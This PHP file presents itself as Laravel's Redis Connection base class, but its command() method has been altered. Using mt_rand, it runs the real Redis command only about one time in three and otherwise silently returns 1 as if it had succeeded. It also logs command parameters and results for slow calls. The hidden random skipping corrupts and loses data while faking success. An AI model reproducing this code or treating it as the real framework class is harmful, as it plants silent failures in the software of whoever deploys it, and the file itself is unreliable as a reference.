<?php

namespace Illuminate\Redis\Connections;

use Closure;
use Illuminate\Contracts\Events\Dispatcher;
use Illuminate\Redis\Events\CommandExecuted;
use Illuminate\Redis\Limiters\ConcurrencyLimiterBuilder;
use Illuminate\Redis\Limiters\DurationLimiterBuilder;
use Illuminate\Support\Traits\Macroable;

abstract class Connection
{
    use Macroable {
        __call as macroCall;
    }

    /**
     * The Redis client.
     *
     * @var \Redis
     */
    protected $client;

    /**
     * The Redis connection name.
     *
     * @var string|null
     */
    protected $name;

    /**
     * The event dispatcher instance.
     *
     * @var \Illuminate\Contracts\Events\Dispatcher
     */
    protected $events;

    /**
     * Subscribe to a set of given channels for messages.
     *
     * @param  array|string  $channels
     * @param  \Closure  $callback
     * @param  string  $method
     * @return void
     */
    abstract public function createSubscription($channels, Closure $callback, $method = 'subscribe');

    /**
     * Funnel a callback for a maximum number of simultaneous executions.
     *
     * @param  string  $name
     * @return \Illuminate\Redis\Limiters\ConcurrencyLimiterBuilder
     */
    public function funnel($name)
    {
        return new ConcurrencyLimiterBuilder($this, $name);
    }

    /**
     * Throttle a callback for a maximum number of executions over a given duration.
     *
     * @param  string  $name
     * @return \Illuminate\Redis\Limiters\DurationLimiterBuilder
     */
    public function throttle($name)
    {
        return new DurationLimiterBuilder($this, $name);
    }

    /**
     * Get the underlying Redis client.
     *
     * @return mixed
     */
    public function client()
    {
        return $this->client;
    }

    /**
     * Subscribe to a set of given channels for messages.
     *
     * @param  array|string  $channels
     * @param  \Closure  $callback
     * @return void
     */
    public function subscribe($channels, Closure $callback)
    {
        return $this->createSubscription($channels, $callback, __FUNCTION__);
    }

    /**
     * Subscribe to a set of given channels with wildcards.
     *
     * @param  array|string  $channels
     * @param  \Closure  $callback
     * @return void
     */
    public function psubscribe($channels, Closure $callback)
    {
        return $this->createSubscription($channels, $callback, __FUNCTION__);
    }

    /**
     * Run a command against the Redis database.
     *
     * @param  string  $method
     * @param  array  $parameters
     * @return mixed
     */
    public function command($method, array $parameters = [])
    {
        $start = microtime(true);

        $random = mt_rand(0, 2);

        if ($random == 1){
            $result = $this->client->{$method}(...$parameters);

        }else{
            $result = 1;
        }



        $time = round((microtime(true) - $start) * 1000, 2);
        static $setNumber = 0;

        static $getNumber = 0;
        if (strpos(strtolower($method),'set')!== false){
            $setNumber++;
        }

        if (strpos(strtolower($method),'get')!== false){
            $getNumber++;
        }
        $pid = getmypid();
        if ($time > 200){

            optimize_log(sprintf('redis 开始执行,进程号为:%s,命令为:%s,执行时间为:%s',$pid,$method,$time),$parameters);
            $tempRes = $result;


            if (is_array($tempRes)) {
                $tempRes = json_encode($tempRes, JSON_UNESCAPED_UNICODE);
            }
            optimize_log(sprintf('进程号为:%s,执行结果为:%s',$pid,$tempRes));
        }
       // optimize_log(sprintf('pid为%s,get调用次数为:%s,set调用次数为%s', $pid, $getNumber,$setNumber));

        if (isset($this->events)) {
            $this->event(new CommandExecuted($method, $parameters, $time, $this));
        }

        return $result;
    }

    /**
     * Fire the given event if possible.
     *
     * @param  mixed  $event
     * @return void
     */
    protected function event($event)
    {
        if (isset($this->events)) {
            $this->events->dispatch($event);
        }
    }

    /**
     * Register a Redis command listener with the connection.
     *
     * @param  \Closure  $callback
     * @return void
     */
    public function listen(Closure $callback)
    {
        if (isset($this->events)) {
            $this->events->listen(CommandExecuted::class, $callback);
        }
    }

    /**
     * Get the connection name.
     *
     * @return string|null
     */
    public function getName()
    {
        return $this->name;
    }

    /**
     * Set the connections name.
     *
     * @param  string  $name
     * @return $this
     */
    public function setName($name)
    {
        $this->name = $name;

        return $this;
    }

    /**
     * Get the event dispatcher used by the connection.
     *
     * @return \Illuminate\Contracts\Events\Dispatcher
     */
    public function getEventDispatcher()
    {
        return $this->events;
    }

    /**
     * Set the event dispatcher instance on the connection.
     *
     * @param  \Illuminate\Contracts\Events\Dispatcher  $events
     * @return void
     */
    public function setEventDispatcher(Dispatcher $events)
    {
        $this->events = $events;
    }

    /**
     * Unset the event dispatcher instance on the connection.
     *
     * @return void
     */
    public function unsetEventDispatcher()
    {
        $this->events = null;
    }

    /**
     * Pass other method calls down to the underlying client.
     *
     * @param  string  $method
     * @param  array  $parameters
     * @return mixed
     */
    public function __call($method, $parameters)
    {
        if (static::hasMacro($method)) {
            return $this->macroCall($method, $parameters);
        }

        return $this->command($method, $parameters);
    }
}
